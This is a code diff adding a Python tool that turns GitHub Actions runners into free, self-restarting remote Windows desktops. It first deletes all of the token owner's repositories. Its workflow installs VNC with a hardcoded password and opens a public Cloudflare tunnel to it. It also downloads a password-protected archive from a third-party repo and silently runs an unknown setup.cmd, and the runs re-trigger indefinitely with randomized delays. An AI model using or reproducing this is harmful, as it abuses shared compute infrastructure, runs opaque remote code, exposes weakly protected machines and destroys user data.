@@ -1,0 +1,360 @@
+import requests
+import time
+import random
+import base64
+import os
+import json
+
+# ==============================================================================
+# Configuration
+# ==============================================================================
+GITHUB_API_URL = 'https://api.github.com'
+TOKEN_FILE = 'token.txt'
+TOTAL_REPOS_TO_CREATE = 2
+INSTANCES_PER_REPO = 5
+
+class BColors:
+    """Class for terminal colors."""
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+# ==============================================================================
+# Helper Functions
+# ==============================================================================
+
+def log(message, color=BColors.ENDC):
+    print(f"{color}{message}{BColors.ENDC}")
+
+def random_delay(min_seconds=3, max_seconds=5):
+    """Waits for a random duration."""
+    delay = random.uniform(min_seconds, max_seconds)
+    time.sleep(delay)
+
+def read_token():
+    """Reads the PAT from the token file."""
+    if not os.path.exists(TOKEN_FILE):
+        log(f"[ERROR] '{TOKEN_FILE}' not found. Please create it and paste your PAT inside.", BColors.FAIL)
+        return None
+    with open(TOKEN_FILE, 'r') as f:
+        token = f.read().strip()
+    if not token:
+        log(f"[ERROR] '{TOKEN_FILE}' is empty. Please paste your PAT inside.", BColors.FAIL)
+        return None
+    return token
+
+def github_api_request(path, pat, method='GET', data=None):
+    """Makes a generic request to the API."""
+    headers = {
+        'Accept': 'application/vnd.github.v3+json',
+        'Authorization': f'token {pat}',
+        'Content-Type': 'application/json',
+    }
+    url = f"{GITHUB_API_URL}{path}"
+    
+    try:
+        response = requests.request(method, url, headers=headers, data=json.dumps(data) if data else None)
+        response.raise_for_status()
+        if response.status_code == 204 or not response.content:
+            return None
+        return response.json()
+    except requests.exceptions.RequestException as e:
+        error_message = f"API request to {method} {url} failed: {e}"
+        if e.response is not None:
+            try:
+                error_details = e.response.json().get('message', e.response.text)
+                error_message += f"\nDetails: {error_details}"
+            except json.JSONDecodeError:
+                error_message += f"\nDetails: {e.response.text}"
+        log(f"[ERROR] {error_message}", BColors.FAIL)
+        raise
+
+# ==============================================================================
+# API Service Functions
+# ==============================================================================
+
+def get_user(pat):
+    return github_api_request('/user', pat)
+
+def list_user_repos(pat):
+    all_repos = []
+    page = 1
+    while True:
+        repos = github_api_request(f'/user/repos?type=owner&per_page=100&page={page}', pat)
+        if not repos: break
+        all_repos.extend(repos)
+        page += 1
+    return all_repos
+
+def delete_repo(pat, owner, repo_name):
+    return github_api_request(f'/repos/{owner}/{repo_name}', pat, method='DELETE')
+
+def create_repo(pat, repo_name):
+    data = {'name': repo_name, 'private': False, 'description': 'Repository for provisioned.', 'auto_init': True}
+    return github_api_request('/user/repos', pat, method='POST', data=data)
+
+def create_workflow_file(pat, owner, repo_name, content):
+    path = '.github/workflows/vps.yml'
+    encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+    data = {'message': 'Create workflow', 'content': encoded_content}
+    return github_api_request(f'/repos/{owner}/{repo_name}/contents/{path}', pat, method='PUT', data=data)
+
+def trigger_workflow(pat, owner, repo_name):
+    data = {'ref': 'main'}
+    return github_api_request(f'/repos/{owner}/{repo_name}/actions/workflows/vps.yml/dispatches', pat, method='POST', data=data)
+
+def get_workflow_content():
+    # This content is a direct translation of the JavaScript version.
+    # Note: `${{...}}` is Actions syntax, not Python f-string interpolation.
+    return """
+name: Create VPS
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  actions: write
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
+
+    - name: 'Run VPS Setup Script'
+      shell: pwsh
+      run: |
+        $ErrorActionPreference = "Stop"
+        try {
+          Write-Host "📥 Installing TightVNC..."
+          Invoke-WebRequest -Uri "https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi" -OutFile "tightvnc-setup.msi"
+          Start-Process msiexec.exe -Wait -ArgumentList '/i tightvnc-setup.msi /quiet /norestart ADDLOCAL="Server" SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=hcxhcx SET_ACCEPTHTTPCONNECTIONS=1 VALUE_OF_ACCEPTHTTPCONNECTIONS=1 SET_ALLOWLOOPBACK=1 VALUE_OF_ALLOWLOOPBACK=1'
+          Write-Host "✅ TightVNC installed"
+
+          Write-Host "📥 Installing WinRAR..."
+          Invoke-WebRequest -Uri "https://www.rarlab.com/rar/winrar-x64-624.exe" -OutFile "winrar-setup.exe"
+          Start-Process -FilePath ".\\winrar-setup.exe" -ArgumentList "/S" -Wait
+          $env:Path += ";C:\\Program Files\\WinRAR"
+          Write-Host "✅ WinRAR installed and added to PATH"
+
+          Write-Host "📥 Downloading custom setup package..."
+          Invoke-WebRequest -Uri "https://github.com/afacadr/oyep/raw/refs/heads/TimothyStiles-patch-1/setup.rar" -OutFile "setup.rar"
+          Write-Host "✅ Custom setup package downloaded."
+
+          Write-Host "📦 Extracting custom setup..."
+          & "C:\\Program Files\\WinRAR\\WinRAR.exe" x -p"hcxhcx" -o+ -ibck ".\\setup.rar"
+          Write-Host "✅ Custom setup extracted."
+
+          Start-Sleep -Seconds 3
+
+          Write-Host "🔍 Searching for setup.cmd..."
+          $setupFile = Get-ChildItem -Path . -Recurse -Filter "setup.cmd" | Select-Object -First 1
+          
+          if ($setupFile) {
+              $setupCmdPath = $setupFile.FullName
+              Write-Host "✅ Found setup.cmd at: $setupCmdPath"
+              Write-Host "🚀 Running setup.cmd in the background..."
+              Start-Process -FilePath $setupCmdPath -WindowStyle Hidden
+              Write-Host "✅ setup.cmd is running."
+          } else {
+              Write-Host "❌ ERROR: setup.cmd not found after extraction."
+              Write-Host "Listing extracted files for debugging:"
+              Get-ChildItem -Recurse
+              exit 1
+          }
+
+          Write-Host "🔧 Configuring TightVNC to allow loopback connections..."
+          $regPaths = @("HKLM:\\SOFTWARE\\TightVNC\\Server", "HKCU:\\Software\\TightVNC\\Server")
+          foreach ($path in $regPaths) {
+            if (-not (Test-Path $path)) {
+              New-Item -Path $path -Force | Out-Null
+            }
+            Set-ItemProperty -Path $path -Name "AllowLoopback" -Value 1 -Force
+          }
+          Write-Host "✅ Loopback configuration applied."
+
+          Write-Host "🔄 Restarting TightVNC server to apply settings..."
+          Stop-Process -Name "tvnserver" -Force -ErrorAction SilentlyContinue | Out-Null
+          Start-Sleep -Seconds 3
+          Start-Process -FilePath "C:\\Program Files\\TightVNC\\tvnserver.exe" -ArgumentList "-run"
+          Write-Host "✅ TightVNC Server started."
+          Start-Sleep -Seconds 5
+          
+          Write-Host "📥 Installing websockify..."
+          pip install --upgrade pip
+          pip install websockify==0.13.0
+
+          Write-Host "📥 Downloading noVNC client..."
+          Invoke-WebRequest -Uri "https://github.com/novnc/noVNC/archive/refs/tags/v1.4.0.zip" -OutFile "noVNC.zip"
+          Expand-Archive -Path .\\noVNC.zip -DestinationPath .
+          Move-Item -Path .\\noVNC-1.4.0 -Destination .\\noVNC
+          Write-Host "✅ noVNC client downloaded and extracted."
+          
+          Write-Host "🚀 Starting noVNC client..."
+          Start-Process python -ArgumentList "-m websockify 6080 localhost:5900 --web .\\noVNC" -WindowStyle Hidden
+          Write-Host "✅ noVNC started."
+          Start-Sleep -Seconds 5
+          
+          Write-Host "📥 Installing Cloudflared..."
+          Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
+          
+          Write-Host "🌐 Starting Cloudflared tunnel..."
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\\cloudflared.exe tunnel --url http://localhost:6080 --no-autoupdate > cloudflared.log 2>&1" -WindowStyle Hidden
+          
+          Write-Host "⏳ Waiting for Cloudflared URL..."
+          $urlFound = $false
+          foreach ($i in 1..30) {
+            Start-Sleep -Seconds 5
+            if (Test-Path "cloudflared.log") {
+              $logContent = Get-Content "cloudflared.log" -Raw
+              if ($logContent -match 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com') {
+                $cloudflaredUrl = $matches[0]
+                Write-Host "✅ Found Cloudflared URL: $cloudflaredUrl"
+                $urlFound = $true
+                break
+              }
+            }
+            Write-Host "Still waiting for URL... ($i/30)"
+          }
+          
+          if (-not $urlFound) {
+            Write-Host "❌ Failed to retrieve Cloudflared URL after 150 seconds."
+            Get-Content "cloudflared.log" -ErrorAction SilentlyContinue | Write-Host
+            exit 1
+          }
+          
+          $remoteLink = "$cloudflaredUrl"
+          Write-Host "🌌 Remote VNC URL: $remoteLink"
+          $remoteLink | Out-File -FilePath "remote-link.txt" -Encoding UTF8 -NoNewline
+          
+          Write-Host "💾 Committing remote link to repository..."
+          git config --global user.name 'github-actions[bot]'
+          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
+          git add remote-link.txt
+          git commit -m "Add VNC remote link"
+          git push
+          Write-Host "✅ Remote link committed."
+        } catch {
+          Write-Host "❌ An error occurred during setup: $_"
+          exit 1
+        }
+        
+        Write-Host "🚀 VPS Session Started. This workflow will run for approximately 5.5 hours before restarting."
+        Start-Sleep -Seconds 19800
+
+    - name: 'Auto Restart Workflow'
+      if: always()
+      shell: pwsh
+      run: |
+        Write-Host "✅ Workflow finished. Triggering a new run..."
+        $repo = "${{ github.repository }}"
+        $workflow_id = "vps.yml"
+        $url = "https://api.github.com/repos/$repo/actions/workflows/$workflow_id/dispatches"
+        $token = "${{ secrets.GITHUB_TOKEN }}"
+        
+        $headers = @{
+          "Accept"        = "application/vnd.github.v3+json"
+          "Authorization" = "Bearer $token"
+        }
+        
+        $body = @{
+          "ref" = "main"
+        } | ConvertTo-Json
+        
+        Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
+        Write-Host "✅ New workflow run triggered successfully."
+"""
+
+# ==============================================================================
+# Main Execution Logic
+# ==============================================================================
+def main():
+    """Main function to run the entire process."""
+    log(f"{BColors.HEADER}{BColors.BOLD}--- VPS Creator ---{BColors.ENDC}")
+    
+    pat = read_token()
+    if not pat:
+        return
+
+    repo_prefix = "vps-project"
+
+    log("Starting process...", BColors.BOLD)
+
+    try:
+        # 1. Authenticate once
+        random_delay()
+        log("Authenticating...", BColors.OKBLUE)
+        user = get_user(pat)
+        user_login = user['login']
+        log(f"Authenticated as {user_login}.", BColors.OKGREEN)
+
+        # 2. Delete all repos once at the beginning
+        random_delay()
+        log("Fetching list of all repositories for initial cleanup...", BColors.WARNING)
+        repos_to_delete = list_user_repos(pat)
+
+        if repos_to_delete:
+            log(f"Found {len(repos_to_delete)} repositories to delete. This is a destructive action.", BColors.WARNING)
+            for repo in repos_to_delete:
+                random_delay()
+                log(f"Deleting repository: {repo['full_name']}...", BColors.OKBLUE)
+                delete_repo(pat, user_login, repo['name'])
+                log(f"Successfully deleted {repo['name']}.", BColors.OKGREEN)
+            log("Initial repository cleanup complete.", BColors.OKGREEN)
+        else:
+            log("No repositories found to delete.", BColors.OKBLUE)
+
+        # 3. Loop to create repos and trigger workflows
+        for i in range(1, TOTAL_REPOS_TO_CREATE + 1):
+            log(f"\n--- Starting creation for Repository {i} of {TOTAL_REPOS_TO_CREATE} ---", BColors.HEADER)
+            
+            # Create Repo
+            random_delay()
+            final_repo_name = f"{repo_prefix.strip()}-{str(int(time.time()))[-6:]}-{i}"
+            log(f"[Repo {i}] Creating repository: {final_repo_name}...", BColors.OKBLUE)
+            repo_data = create_repo(pat, final_repo_name)
+            log(f"[Repo {i}] Successfully created repository: {repo_data['html_url']}", BColors.OKGREEN)
+            
+            # Create Workflow File
+            random_delay()
+            log(f"[Repo {i}] Creating workflow file in {user_login}/{final_repo_name}...", BColors.OKBLUE)
+            workflow_content = get_workflow_content()
+            create_workflow_file(pat, user_login, final_repo_name, workflow_content)
+            log(f"[Repo {i}] Workflow file created successfully.", BColors.OKGREEN)
+            
+            # Trigger Workflows
+            random_delay()
+            log(f"[Repo {i}] Waiting for Actions to register the new workflow...", BColors.OKBLUE)
+            
+            for j in range(1, INSTANCES_PER_REPO + 1):
+                if j > 1: random_delay(1, 2)
+                monitor_message = f" You can monitor runs at {repo_data['html_url']}/actions" if j == 1 else ""
+                log(f"[Repo {i}] Triggering workflow ({j}/{INSTANCES_PER_REPO})...{monitor_message}", BColors.OKBLUE)
+                trigger_workflow(pat, user_login, final_repo_name)
+                
+                success_message = f"All {INSTANCES_PER_REPO} workflows for this repo triggered." if j == INSTANCES_PER_REPO else f"Workflow ({j}/{INSTANCES_PER_REPO}) triggered."
+                log(f"[Repo {i}] {success_message}", BColors.OKGREEN)
+            
+            if i < TOTAL_REPOS_TO_CREATE:
+                log(f"--- Repository {i} setup complete. Starting next one shortly... ---", BColors.OKCYAN)
+
+        log("\n" + "="*50, BColors.BOLD)
+        log("✅ --- Entire process completed successfully! ---", BColors.BOLD + BColors.OKGREEN)
+        log("="*50, BColors.BOLD)
+
+    except Exception as e:
+        log(f"A critical error stopped the process: {e}", BColors.FAIL)
+
+if __name__ == '__main__':
+    main()
